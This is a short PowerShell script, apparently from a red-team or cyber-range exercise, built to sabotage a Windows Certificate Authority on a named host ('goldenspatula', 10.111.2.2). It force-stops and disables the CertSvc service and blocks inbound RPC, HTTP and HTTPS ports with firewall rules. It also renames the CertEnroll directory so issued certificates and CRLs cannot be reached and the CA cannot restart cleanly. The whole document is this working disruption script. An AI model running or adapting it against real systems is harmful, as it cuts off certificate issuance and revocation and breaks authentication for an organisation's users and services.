# goldenspatula (10.111.2.2) - Certificate Authority disruption
# Windows CA runs as "CertSvc" (Active Directory Certificate Services)

# Stop and disable the CA service
Stop-Service -Name "CertSvc" -Force -ErrorAction SilentlyContinue
Set-Service  -Name "CertSvc" -StartupType Disabled -ErrorAction SilentlyContinue

# Block CA enrollment ports
$rules = @(
    @{Name="Block CA RPC";       Port=135},
    @{Name="Block CA HTTPS";     Port=443},
    @{Name="Block CA HTTP";      Port=80}
)
foreach ($r in $rules) {
    $existing = Get-NetFirewallRule -DisplayName $r.Name -ErrorAction SilentlyContinue
    if (-not $existing) {
        New-NetFirewallRule -DisplayName $r.Name -Direction Inbound -Protocol TCP -LocalPort $r.Port -Action Block
    }
}

# Corrupt the CA config database path so it can't reinitialize cleanly
$caConfig = "$env:SystemRoot\System32\CertSrv\CertEnroll"
if (Test-Path $caConfig) {
    # Rename the CertEnroll directory so issued certs and CRLs are inaccessible
    Rename-Item $caConfig "$caConfig.bak" -ErrorAction SilentlyContinue
}

Write-Host "[*] CA disruption complete on goldenspatula"
